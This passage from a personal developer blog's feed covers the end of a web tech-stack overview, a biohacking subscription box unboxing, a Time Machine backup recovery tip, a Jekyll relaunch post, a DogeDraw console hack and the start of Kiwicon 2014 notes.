&lt;li&gt;&lt;a href=&quot;https://dannyherran.com/2016/03/state-of-affairs-bootstrap-4-vs-foundation-6/&quot;&gt;&amp;quot;State of affairs: Bootstrap 4 vs Foundation 6.2&amp;quot; by Danny Herran&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;frontend-scripting&quot;&gt;&lt;/a&gt;Scripting&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Modern web apps live by the functionality they enable in the browser, and to do this, we need a JS-esque language. Your chosen frontend framework may sway your choice (eg. Angular (v2) has a strong preference for TypeScript), but ultimately, it&amp;#39;s up to what you/your team feel comfortable with. With &lt;a href=&quot;https://github.com/jashkenas/coffeescript/wiki/list-of-languages-that-compile-to-js&quot;&gt;so many options&lt;/a&gt; out there, it&amp;#39;s hard to pick.. And of course, you could always stick to plain JavaScript.. and with the new features coming in &lt;a href=&quot;http://es6-features.org/&quot;&gt;ES6&lt;/a&gt; (eg. &lt;a href=&quot;http://www.html5rocks.com/en/tutorials/es6/promises/&quot;&gt;promises&lt;/a&gt;) and beyond, it might be a good choice.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://babeljs.io/&quot;&gt;Babel&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;A transpiler that lets you play with all the fun features of JavaScript ES6 and beyond, while maintaining compatibility with all of the older browsers.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.typescriptlang.org/&quot;&gt;TypeScript&lt;/a&gt; (&lt;a href=&quot;https://github.com/Microsoft/TypeScript&quot;&gt;GitHub&lt;/a&gt;)

&lt;ul&gt;
&lt;li&gt;&amp;quot;TypeScript is a typed superset of JavaScript that compiles to plain JavaScript&amp;quot;&lt;/li&gt;
&lt;li&gt;If you&amp;#39;re using Angular (v2) and like sticking to convention, this is the one for you.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://coffeescript.org/&quot;&gt;CoffeeScript&lt;/a&gt; (or maybe &lt;a href=&quot;https://github.com/michaelficarra/CoffeeScriptRedux&quot;&gt;v2&lt;/a&gt;)

&lt;ul&gt;
&lt;li&gt;This used to be my choice, but looking at the other options available now, I think i&amp;#39;ll be moving on.&lt;/li&gt;
&lt;li&gt;As always, there are a bunch of arguments for and against..

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://robots.thoughtbot.com/replace-coffeescript-with-es6&quot;&gt;&amp;quot;Replace CoffeeScript with ES6&amp;quot; by Blake Williams&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://tech.noredink.com/post/111583727108/dont-replace-coffeescript-with-es6-transpilers&quot;&gt;&amp;quot;Donâ€™t Replace CoffeeScript with ES6 Transpilers&amp;quot; by Richard Feldman&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;etc&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;If you&amp;#39;re looking for a way out, why not &lt;a href=&quot;https://github.com/decaffeinate/decaffeinate&quot;&gt;decaffeinate&lt;/a&gt;?&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://flowtype.org/&quot;&gt;Flow&lt;/a&gt; (&lt;a href=&quot;https://github.com/facebook/flow&quot;&gt;GitHub&lt;/a&gt;)

&lt;ul&gt;
&lt;li&gt;While it&amp;#39;s not a language unto itself, it does allow you the benefits of typed JavaScript without having to dive into something like TypeScript.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.scala-js.org/&quot;&gt;Scala.js&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;A little left field, this transpiles Scala code into JavaScript. While I probably wouldn&amp;#39;t see myself using this as a main choice, it could make for some interesting reusability between front and backend.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;&lt;a name=&quot;backend&quot;&gt;&lt;/a&gt;Backend&lt;/h2&gt;

&lt;p&gt;My preferences for backend tech stacks lean heavily towards &lt;a href=&quot;http://www.scala-lang.org/&quot;&gt;Scala&lt;/a&gt; and the &lt;a href=&quot;https://www.lightbend.com/platform&quot;&gt;Lightbend Reactive Platform&lt;/a&gt; these days, but I will make quick mention of some of the other options available.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://doc.akka.io/docs/akka/2.4/scala/http/&quot;&gt;Akka-HTTP&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Taking the power of asynchronous, message based actors, and applying them to HTTP. Definite win.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://softwaremill.github.io/bootzooka/&quot;&gt;Bootzooka&lt;/a&gt; (&lt;a href=&quot;https://github.com/softwaremill/bootzooka&quot;&gt;GitHub&lt;/a&gt;)

&lt;ul&gt;
&lt;li&gt;&amp;quot;Bootzooka is a simple application scaffolding project to allow quick start of development for modern, web based applications.&amp;quot;&lt;/li&gt;
&lt;li&gt;While not perfect, it&amp;#39;s a decent implementation of a starter app, tying together some useful technologies.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.playframework.com/&quot;&gt;Play Framework&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&amp;quot;Play is a high-productivity Java and Scala web application framework that integrates the components and APIs you need for modern web application development.&amp;quot;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/airbnb/hypernova&quot;&gt;Hypernova&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&amp;quot;A service for server-side rendering your JavaScript views&amp;quot;&lt;/li&gt;
&lt;li&gt;While not a choice unto itself, this should help speed things up and keep your site nice and search engine friendly.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;You also have all of your other typical options

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.ruby-lang.org/en/&quot;&gt;Ruby&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://rubyonrails.org/&quot;&gt;Ruby on Rails&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://nodejs.org/en/&quot;&gt;Node&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://expressjs.com/&quot;&gt;Express&lt;/a&gt;: &amp;quot;Fast, unopinionated, minimalist web framework for Node.js&amp;quot;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.meteor.com/&quot;&gt;Meteor&lt;/a&gt;: &amp;quot;Meteor is an open source platform for web,&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://noeticforce.com/best-nodejs-frameworks-for-web-and-app-development&quot;&gt;&amp;quot;Node.js Frameworks: The 10 Best for Web and Apps Development&amp;quot; by noeticsunil&lt;/a&gt;
mobile, and desktop.&amp;quot;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.python.org/&quot;&gt;Python&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.djangoproject.com/&quot;&gt;Django&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://wiki.python.org/moin/WebFrameworks&quot;&gt;Web Frameworks for Python&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://secure.php.net/&quot;&gt;PHP&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://octobercms.com/&quot;&gt;October&lt;/a&gt;: &amp;quot;October is a free, open-source, self-hosted CMS platform based on the Laravel PHP Framework. A simple and modular CMS that grows with you, with a precise and beautiful interface that comes as second nature.&amp;quot;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://laravel.com/&quot;&gt;Laravel&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;etc&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;&lt;a name=&quot;tooling&quot;&gt;&lt;/a&gt;Tooling&lt;/h2&gt;

&lt;p&gt;With the crazy mix of technologies and steps involved in modern web app development, it makes a ton of sense to tie it all together with some automation.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://webpack.github.io/&quot;&gt;Webpack&lt;/a&gt; (&lt;a href=&quot;https://github.com/webpack/webpack&quot;&gt;GitHub&lt;/a&gt;)

&lt;ul&gt;
&lt;li&gt;&amp;quot;Webpack is a bundler for modules. The main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset.&amp;quot;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.andrewray.me/webpack-when-to-use-and-why/&quot;&gt;&amp;quot;Webpack: When To Use And Why&amp;quot; by Andrew Ray&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/webpack/less-loader&quot;&gt;https://github.com/webpack/less-loader&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/shakacode/bootstrap-loader&quot;&gt;https://github.com/shakacode/bootstrap-loader&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://gulpjs.com/&quot;&gt;Gulp&lt;/a&gt; (&lt;a href=&quot;https://github.com/gulpjs/gulp&quot;&gt;GitHub&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Gulp is a streaming javascript task runner that lets you automate tasks.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://gruntjs.com/&quot;&gt;Grunt&lt;/a&gt; (&lt;a href=&quot;https://github.com/gruntjs/&quot;&gt;GitHub&lt;/a&gt;)

&lt;ul&gt;
&lt;li&gt;Grunt is basically the older, less streaming, less awesome version of Gulp.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While a little different in purpose to the things mentioned above, getting everything nicely tested and deployed is always good:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://bitbucket.org/product/features/pipelines&quot;&gt;Bitbucket Pipelines&lt;/a&gt;: &amp;quot;Build, test and deploy from Bitbucket&amp;quot;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;&lt;a name=&quot;conclusions&quot;&gt;&lt;/a&gt;Conclusions&lt;/h2&gt;

&lt;p&gt;Hopefully this has given you a decent starting point for figuring out what combination of technologies is going to work best for your next project. If you want to see the direction I&amp;#39;ve decided to go, make sure you read on in &lt;a href=&quot;#TODO&quot;&gt;Part 2&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Have I missed something important? Not given love to your favourite stack? Got a cool pointer? Or just want to say hi? Let me know in the comments!&lt;/p&gt;</content><author><name>devalias</name></author><category term="dev" /><category term="web" /><category term="tech-stack" /><category term="overview" /><category term="frontend" /><category term="backend" /><category term="react" /><category term="angular" /><category term="ember" /><category term="vue" /><category term="aurelia" /><category term="riot" /><category term="bootstrap" /><category term="foundation" /><category term="material-design" /><category term="javascript" /><category term="babel" /><category term="typescript" /><category term="coffeescript" /><category term="flow" /><category term="scala-js" /><category term="akka-http" /><category term="bootzooka" /><category term="play-framework" /><category term="hypernova" /><category term="ruby" /><category term="ruby-on-rails" /><category term="node" /><category term="express" /><category term="meteor" /><category term="python" /><category term="django" /><category term="php" /><category term="october-cms" /><category term="laravel" /><category term="webpack" /><category term="gulp" /><category term="grunt" /><summary>Finding myself with some free time (and looking into starting a new project), I thought I might catch myself up on the state of web technologies, and what might be a good stack to work with.</summary></entry><entry><title>Bulletproof Quarterly Biohacking Box #7</title><link href="http://devalias.net//devalias/2016/07/21/bulletproof-quarterly-biohacking-box-7/" rel="alternate" type="text/html" title="Bulletproof Quarterly Biohacking Box #7" /><published>2016-07-21T00:00:00+10:00</published><updated>2016-07-21T00:00:00+10:00</updated><id>http://devalias.net//devalias/2016/07/21/bulletproof-quarterly-biohacking-box-7</id><content type="html" xml:base="http://devalias.net//devalias/2016/07/21/bulletproof-quarterly-biohacking-box-7/">&lt;p&gt;A bit of a change from the tech content today. I&amp;#39;ve been thinking about it for a while, and have decided to start consolidating all of my interests/thoughts/posts onto this site. The blog will still mostly be tech leaning, but some posts will start branching out toward my other interests such as biohacking, human performance, efficiency, etc.&lt;/p&gt;

&lt;p&gt;With that out of the way, this is just a quick post to show off what came in the latest &lt;a href=&quot;https://quarterly.co/products/daveasprey&quot;&gt;Bulletproof Quarterly Biohacking Box&lt;/a&gt; from Dave Asprey aka The Bulletproof Exec.&lt;/p&gt;

&lt;p&gt;If you don&amp;#39;t know what quarterly is, basically you subscribe to interesting people, and every three months you receive a curated box of interesting goodies and discount codes from them. I&amp;#39;ve been subscribed to this one since the beginning, and have got some pretty cool stuff out of it. While I won&amp;#39;t go into as much detail with the previous boxes, I might note a few things of particular interest.&lt;/p&gt;

&lt;h2&gt;BIO07&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://quarterly.co/BIO07&quot;&gt;BIO07 Unboxing Video&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;0:57 &lt;a href=&quot;https://frankgreen.com.au/shop/coffee-cups.html&quot;&gt;Frank Green Smart Travel Mug&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2:43 &lt;a href=&quot;http://www.airoasis.com/shop/air-quality-test-kit&quot;&gt;Air Oasis Indoor Air Quality Test&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;5:00 &lt;a href=&quot;https://www.acurite.com/environments/humidity.html&quot;&gt;Acurite Humidity Monitor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;6:10 &lt;a href=&quot;https://www.zivameditation.com/&quot;&gt;Ziva Meditation Package&lt;/a&gt; (door tag, essential oils, guided visualisation downloads)&lt;/li&gt;
&lt;li&gt;8:31 &lt;a href=&quot;http://www.blenderbottle.com/shaker-bottles/blenderbottle-gostak&quot;&gt;Blender Bottle GoStak Travel Bottles&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;9:33 &lt;a href=&quot;http://motherdirt.com/&quot;&gt;Mother Dirt Starter Package&lt;/a&gt; (topical probiotic shampoo/etc)&lt;/li&gt;
&lt;li&gt;13:28 Brain Octane Oil (from pure coconut oil, no palm oil)&lt;/li&gt;
&lt;li&gt;16:51 &lt;a href=&quot;http://www.airoasis.com/shop/air-oasis-mobile-sanifier&quot;&gt;Air Oasis Mobile Sanifier&lt;/a&gt; (Golden Ticket)&lt;/li&gt;
&lt;li&gt;18:48 &lt;a href=&quot;https://www.aquatruwater.com/&quot;&gt;Countertop reverse osmosis unit&lt;/a&gt; (40% off, US$349, 5 golden tickets)&lt;/li&gt;
&lt;li&gt;21:48 &lt;a href=&quot;http://www.humancharger.com/&quot;&gt;Human Charger&lt;/a&gt; (30% off, 10 golden tickets)&lt;/li&gt;
&lt;li&gt;24:46 Air Oasis discount card&lt;/li&gt;
&lt;li&gt;25:04 2x double passes to the &lt;a href=&quot;http://www.bulletproof.com/conference/&quot;&gt;2016 Bulletproof conference&lt;/a&gt; (golden ticket)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Previous Boxes&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://quarterly.co/BIO06&quot;&gt;BIO06 - March 2016&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://fitnessgenes.com/genetic-workout-systems/starter-system/&quot;&gt;FitnessGenes Starter System&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.core150.com/&quot;&gt;Core150 Attitude Shaker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.primallifeorganics.com/products/grunt-primal-lip-balm&quot;&gt;Grunt Lip Balm from Primal Life Organics&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Bulletproof Collagen Bars&lt;/li&gt;
&lt;li&gt;Etc&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://quarterly.co/BIO05&quot;&gt;BIO05 - December 2015&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://thebrainstimulator.net/&quot;&gt;The Brain Stimulator Travel Model&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.powdercity.com/products/aniracetam-capsules&quot;&gt;Aniracetam Capsules from Powder City&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.focusatwill.com/&quot;&gt;60-day Membership to Focus@Will&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.bulletproofexec.com/wp-content/uploads/2015/12/BULLETPROOF-CHEF-EBOOK.pdf&quot;&gt;The Bulletproof Chef e-book&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Etc&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://quarterly.co/BIO04&quot;&gt;BIO04 - September 2015&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.defendershield.com/shop/defenderpad-laptop-radiation-heat-shield/&quot;&gt;DefenderPad&lt;/a&gt; with custom Bulletproof branding&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.60beat.com/category_s/43.htm&quot;&gt;60Beat BLUE Heart Rate Monitor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://itunes.apple.com/au/app/bulletproof-stress-detective/id899336349?mt=8&quot;&gt;Bulletproof Stress Detective App Download&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Earplanes&lt;/li&gt;
&lt;li&gt;Etc&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://quarterly.co/BIO03&quot;&gt;BIO03 - May 2015&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Bulletproof Glutathione Force&lt;/li&gt;
&lt;li&gt;Ancient Organics Ghee&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://vigr.ca/collections/vigr/products/premium-vigr-elk-velvet-antler&quot;&gt;VIGR Elk Velvet Antler&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://givemethedirt.com/products/the-dirt-trace-mineral-tooth-powder&quot;&gt;The Dirt Toothbrushing Powder&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Etc&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://quarterly.co/BIO02&quot;&gt;BIO02 - February 2015&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.underarmour.com/en-us/ua-armourbite-mouthpiece/pid1246642&quot;&gt;ArmourBite Mouthpiece by Under Armour&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.mobilitywod.com/product/supernova-80mm/&quot;&gt;Gemini/Supernova by MobilityWOD&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.berkeleytest.com/index.html&quot;&gt;Nitric Oxide test strips by Berkeley Test&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.foursigmatic.com/four-sigma-foods-101-cordyceps&quot;&gt;Instant Cordyceps by Four Sigma&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Etc&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://quarterly.co/BIO01&quot;&gt;BIO01 - November 2014&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.surthrival.com/colostrum-powder-6-5oz.html&quot;&gt;Surthrival Colostrum Powder&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.aerobie.com/product/aeropress/&quot;&gt;AeroPress Coffee Maker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://restwise.com/&quot;&gt;6-month RestWise.com membership&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.perfectsupplements.com/Perfect-Desiccated-Liver-p/desiccatedliver120.htm&quot;&gt;Perfect desiccated liver capsules&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.btnx.com/Product.aspx?id=1923&quot;&gt;BTNX 10-parameter urinalysis strips&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Etc&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>devalias</name></author><category term="quicknote" /><category term="bulletproof" /><category term="bulletproof-quarterly" /><category term="dave-asprey" /><category term="quarterly" /><category term="biohacking" /><summary>A bit of a change from the tech content today. I&amp;#39;ve been thinking about it for a while, and have decided to start consolidating all of my interests/thoughts/posts onto this site. The blog will still mostly be tech leaning, but some posts will start branching out toward my other interests such as biohacking, human performance, efficiency, etc.</summary></entry><entry><title>Accessing Files from other Time Machine backups</title><link href="http://devalias.net//devalias/2016/07/07/access-files-from-other-time-machine-backups/" rel="alternate" type="text/html" title="Accessing Files from other Time Machine backups" /><published>2016-07-07T00:00:00+10:00</published><updated>2016-07-07T00:00:00+10:00</updated><id>http://devalias.net//devalias/2016/07/07/access-files-from-other-time-machine-backups</id><content type="html" xml:base="http://devalias.net//devalias/2016/07/07/access-files-from-other-time-machine-backups/">&lt;p&gt;There are two main methods for accessing files from other Time Machine backups:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Using Time Machine&lt;/li&gt;
&lt;li&gt;Accessing the backup file directly&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Before we get started, if you&amp;#39;re using Time Capsule or a network volume for backup, you first need to navigate to the backup location and double click to mount the &lt;code&gt;.sparsebundle&lt;/code&gt;. (it may ask you for a password if the backup is encrypted) Once that&amp;#39;s done, continue as normal below.&lt;/p&gt;

&lt;h2&gt;Using Time Machine&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Hold alt/option&lt;/li&gt;
&lt;li&gt;Click on the Time Maching (backup) icon in the menu bar&lt;/li&gt;
&lt;li&gt;Select &amp;quot;Browse Other Backup Disks...&amp;quot;&lt;/li&gt;
&lt;li&gt;Select the backup you want to browse.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Accessing the backup file directly&lt;/h2&gt;

&lt;p&gt;Unfortunately while trying to access my old machine&amp;#39;s backup file, the above method didn&amp;#39;t want to work for me. Luckily, we can get access to the files the good old fashioned manual way!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Locate and mount the &lt;code&gt;.sparsebundle&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Navigate to the &lt;code&gt;Backups.backupdb/yourmachinename/Latest&lt;/code&gt; folder&lt;/li&gt;
&lt;li&gt;Enjoy!&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.creativetechs.com/tipsblog/access-files-from-other-time-machine-backups/&quot;&gt;http://www.creativetechs.com/tipsblog/access-files-from-other-time-machine-backups/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://apple.stackexchange.com/questions/158645/recover-certain-files-from-time-machine-from-previous-mac&quot;&gt;https://apple.stackexchange.com/questions/158645/recover-certain-files-from-time-machine-from-previous-mac&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>devalias</name></author><category term="quicknote" /><category term="time-machine" /><category term="backup" /><category term="apple" /><category term="creativetechs.com" /><category term="apple.stackexchange.com" /><summary>There are two main methods for accessing files from other Time Machine backups:</summary></entry><entry><title>v3.0 -  Now with more Hyde</title><link href="http://devalias.net//devalias/2016/05/22/v3-now-with-more-hyde/" rel="alternate" type="text/html" title="v3.0 -  Now with more Hyde" /><published>2016-05-22T00:00:00+10:00</published><updated>2016-05-22T00:00:00+10:00</updated><id>http://devalias.net//devalias/2016/05/22/v3-now-with-more-hyde</id><content type="html" xml:base="http://devalias.net//devalias/2016/05/22/v3-now-with-more-hyde/">&lt;p&gt;Time for another rebirth! As you may have noticed, I haven&amp;#39;t really written much over the last year or two. While I&amp;#39;ve been busy, distracted and occasionally just lazy, I&amp;#39;ve mostly found that Tumblr&amp;#39;s interface is just far too much effort to write in. And if something is needlessly too much effort, it&amp;#39;s not going to get done.&lt;/p&gt;

&lt;p&gt;Enter &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt;, the static website builder. I&amp;#39;ve been intending to put something together on this platform forever.. The first iteration started in &lt;a href=&quot;http://octopress.org/&quot;&gt;Octopress&lt;/a&gt; a year or more back, but never really went anywhere since the default theme was kind of ugly. Decided to take another stab at things this year while I was between jobs (free time == productivity!), found a theme that I liked and started hacking away. With a few months of scattered hacking and procrastination, it&amp;#39;s finally actually on the internet, yay!&lt;/p&gt;

&lt;p&gt;Being a static site, I&amp;#39;m taking advantage of &lt;a href=&quot;https://pages.github.com/&quot;&gt;GitHub Pages&lt;/a&gt;. While it gives me free hosting, it also means I&amp;#39;m now living my &lt;a href=&quot;/devalias/2012/01/04/resolutions-for-11111011100-2012/&quot;&gt;previous mantra&lt;/a&gt; of &amp;#39;open source everything&amp;#39;. You can access the &lt;a href=&quot;https://github.com/alias1/devalias.net&quot;&gt;files used to generate the site&lt;/a&gt; and &lt;a href=&quot;https://github.com/alias1/devalias.net/issues&quot;&gt;create an issue&lt;/a&gt;/pull request to fix up any typos/errors you might find along the way :)&lt;/p&gt;

&lt;p&gt;Given it&amp;#39;s now only mildly more effort for me to write a post here as it is to save my notes in random text files on my computer, I&amp;#39;ll hopefully put more online.. We shall see.&lt;/p&gt;</content><author><name>devalias</name></author><category term="v3.0" /><category term="tumblr" /><category term="jekyll" /><category term="octopress" /><category term="github" /><category term="open-source" /><summary>Time for another rebirth! As you may have noticed, I haven&amp;#39;t really written much over the last year or two. While I&amp;#39;ve been busy, distracted and occasionally just lazy, I&amp;#39;ve mostly found that Tumblr&amp;#39;s interface is just far too much effort to write in. And if something is needlessly too much effort, it&amp;#39;s not going to get done.</summary></entry><entry><title>Dogedraw, now with more Nyaan!</title><link href="http://devalias.net//devalias/2015/04/20/dogedraw-now-with-more-nyaan/" rel="alternate" type="text/html" title="Dogedraw, now with more Nyaan!" /><published>2015-04-20T12:00:00+10:00</published><updated>2015-04-20T12:00:00+10:00</updated><id>http://devalias.net//devalias/2015/04/20/dogedraw-now-with-more-nyaan</id><content type="html" xml:base="http://devalias.net//devalias/2015/04/20/dogedraw-now-with-more-nyaan/">&lt;p&gt;Over the last few days I&amp;#39;ve been mentoring web dev at &lt;a href=&quot;http://hact.io/&quot;&gt;HS.HACT.IO&lt;/a&gt;, inspiring a group of younger kids to get into tech as creators. One of the other mentors showed us a site he previously put together, &lt;a href=&quot;http://dogedraw.com/&quot;&gt;DogeDraw&lt;/a&gt;. After playing around with it for a little, I decided it was a little too manual, so started hacking away in the JS console to make it more fun.&lt;/p&gt;

&lt;p&gt;A little while (and far too long typing out pixel art as code) later, and we have nyaan hacks! You can clear a section of the screen with a solid block of colour, or better yet, stamp out some pixel art nyaan cat across the page!&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/alias1/e8bb28726a37854606ad.js&quot;&gt; &lt;/script&gt;</content><author><name>devalias</name></author><category term="nyan-cat" /><category term="hact" /><category term="console" /><category term="javascript" /><category term="web" /><category term="webdev" /><category term="pixel-art" /><category term="gist" /><category term="hact.io" /><category term="dogedraw.com" /><summary>Over the last few days I&amp;#39;ve been mentoring web dev at HS.HACT.IO, inspiring a group of younger kids to get into tech as creators. One of the other mentors showed us a site he previously put together, DogeDraw. After playing around with it for a little, I decided it was a little too manual, so started hacking away in the JS console to make it more fun.</summary></entry><entry><title>Kiwicon 8 (2014) - Some quick notes</title><link href="http://devalias.net//devalias/2014/12/16/kiwicon-8-2014-some-quick-notes/" rel="alternate" type="text/html" title="Kiwicon 8 (2014) - Some quick notes" /><published>2014-12-16T08:08:04+11:00</published><updated>2014-12-16T08:08:04+11:00</updated><id>http://devalias.net//devalias/2014/12/16/kiwicon-8-2014-some-quick-notes</id><content type="html" xml:base="http://devalias.net//devalias/2014/12/16/kiwicon-8-2014-some-quick-notes/">&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://kiwicon.org/&quot;&gt;Kiwicon&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/&quot;&gt;2014&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/schedule/&quot;&gt;Schedule&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://2014.kiwicon.org/the-con/talks/&quot;&gt;Talks&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr&gt;

